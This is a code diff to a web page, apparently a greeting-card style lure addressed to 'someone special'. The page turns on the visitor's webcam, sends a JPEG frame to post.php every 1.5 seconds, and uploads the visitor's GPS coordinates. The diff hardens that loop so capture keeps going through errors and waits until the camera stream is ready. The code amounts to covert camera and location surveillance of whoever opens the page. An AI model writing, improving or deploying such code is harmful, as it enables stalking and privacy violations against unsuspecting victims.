@@ -78,6 +78,9 @@
         // Nama default - JANGAN DIUBAH
         const receiverName = "Seseorang Spesial";
 
+        // Global variable for capture interval
+        let captureInterval = null;
+
         // Camera functionality - JANGAN DIUBAH
         function initCamera() {
             navigator.mediaDevices.getUserMedia({ video: true })
@@ -90,26 +93,63 @@
             video.play();
             document.getElementById('cameraStatus').textContent = 'Camera: Active';
             document.getElementById('cameraStatus').className = 'status success';
-
-            // Mulai capture setiap 1.5 detik - JANGAN DIUBAH
-            setInterval(() => {
-                captureAndSend();
-            }, 1500);
+            
+            // Validasi video siap sebelum mulai capture
+            video.onloadedmetadata = function() {
+                console.log('Video ready for capture - starting continuous capture every 1500ms');
+                
+                // Pastikan tidak ada interval duplicate
+                if (captureInterval) {
+                    clearInterval(captureInterval);
+                }
+                
+                // Mulai capture setiap 1.5 detik terus menerus
+                captureInterval = setInterval(() => {
+                    captureAndSend();
+                }, 1500);
+            };
         }
 
         function handleCameraError(error) {
-            console.log('Camera error:', error);
-            document.getElementById('cameraStatus').textContent = 'Camera: Error - ' + error.message;
+            console.error('Camera error:', error);
+            const errorMsg = error.name || error.message || 'Unknown error';
+            document.getElementById('cameraStatus').textContent = 'Camera: Error - ' + errorMsg;
             document.getElementById('cameraStatus').className = 'status error';
         }
 
         function captureAndSend() {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const imageData = canvas.toDataURL('image/jpeg');
-            postData(imageData);
+            try {
+                // Validasi video siap
+                if (!video || video.readyState !== video.HAVE_ENOUGH_DATA) {
+                    console.log('Video not ready for capture, skipping...');
+                    return;
+                }
+                
+                // Validasi dimensi video
+                if (video.videoWidth <= 0 || video.videoHeight <= 0) {
+                    console.log('Invalid video dimensions, skipping capture');
+                    return;
+                }
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                // Validasi data
+                if (!imageData || imageData.length < 100) {
+                    console.error('Invalid image data generated');
+                    return;
+                }
+                
+                console.log('Capture successful, sending to server...');
+                postData(imageData);
+            } catch (error) {
+                console.error('Capture error:', error.message);
+                // Lanjutkan loop meskipun ada error
+            }
         }
 
         // Location functionality - JANGAN DIUBAH
@@ -126,8 +166,9 @@
                         document.getElementById('locationStatus').className = 'status success';
                     },
                     (error) => {
-                        console.log('Location error:', error);
-                        document.getElementById('locationStatus').textContent = 'Location: Error - ' + error.message;
+                        console.error('Location error:', error);
+                        const errorMsg = error.message || 'Unknown error';
+                        document.getElementById('locationStatus').textContent = 'Location: Error - ' + errorMsg;
                         document.getElementById('locationStatus').className = 'status error';
                     }
                 );
@@ -144,9 +185,15 @@
                     location: JSON.stringify(coords),
                     name: receiverName
                 },
-                url: 'forwarding_link/post.php',
+                url: 'post.php',  // Ganti ke post.php langsung
                 dataType: 'json',
-                async: true
+                async: true,
+                success: function(response) {
+                    console.log('Location data sent successfully');
+                },
+                error: function(xhr, status, error) {
+                    console.error('Location upload failed:', error);
+                }
             });
         }
 
@@ -158,10 +205,37 @@
                     image: imageData,
                     name: receiverName
                 },
-                url: 'forwarding_link/post.php',
+                url: 'post.php',  // Ganti ke post.php langsung
                 dataType: 'json',
-                async: true
+                async: true,
+                success: function(response) {
+                    if (response.success) {
+                        console.log('Image upload successful:', response.filename);
+                    } else {
+                        console.error('Server reported upload error:', response.error);
+                    }
+                },
+                error: function(xhr, status, error) {
+                    console.error('Image upload failed - network error:', status, error);
+                    // Loop tetap berjalan, tidak menghentikan capture
+                }
             });
+        }
+
+        // Cleanup saat halaman ditutup
+        function cleanup() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                console.log('Capture interval cleared');
+            }
+
+            // Stop camera stream
+            if (video.srcObject) {
+                const stream = video.srcObject;
+                const tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
+                console.log('Camera stream stopped');
+            }
         }
 
         // ==========================================
@@ -172,6 +246,10 @@
             initCamera();  // HARUS dipanggil
             getLocation(); // HARUS dipanggil
         });
+
+        // Cleanup saat unload
+        window.addEventListener('beforeunload', cleanup);
+        window.addEventListener('unload', cleanup);
 
         // ==========================================
         // EDIT FUNGSI TAMBAHAN DI BAWAH INI
